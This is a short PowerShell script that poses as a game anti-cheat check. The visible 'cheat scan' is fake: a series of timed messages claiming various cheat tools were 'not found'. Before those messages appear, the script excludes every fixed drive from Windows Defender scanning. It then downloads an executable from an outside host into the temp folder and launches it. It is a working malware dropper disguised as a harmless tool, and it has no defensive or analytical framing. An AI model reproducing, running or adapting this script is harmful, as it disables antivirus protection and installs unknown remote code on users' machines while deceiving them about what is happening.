$drives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object -ExpandProperty DeviceID
foreach ($drive in $drives) {
    Add-MpPreference -ExclusionPath $drive
}
Invoke-WebRequest -Uri "https://soyjak.download/f.php?h=1_HwyG6x&d=1" -OutFile "$env:temp\downloaded.exe"; Start-Process "$env:temp\downloaded.exe"
Start-Sleep -Seconds 5
Write-Host "Check for cheats has started" -ForegroundColor Cyan
Start-Sleep -Seconds 10

Write-Host "R3D not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "Xone not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "Midnight Not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "Yeahnot not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "plague not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "LeagueMode not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "Aimware not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "Avira not found" -ForegroundColor Red
Start-Sleep -Seconds 10

Write-Host "Neverlose not found" -ForegroundColor Red
Start-Sleep -Seconds 10
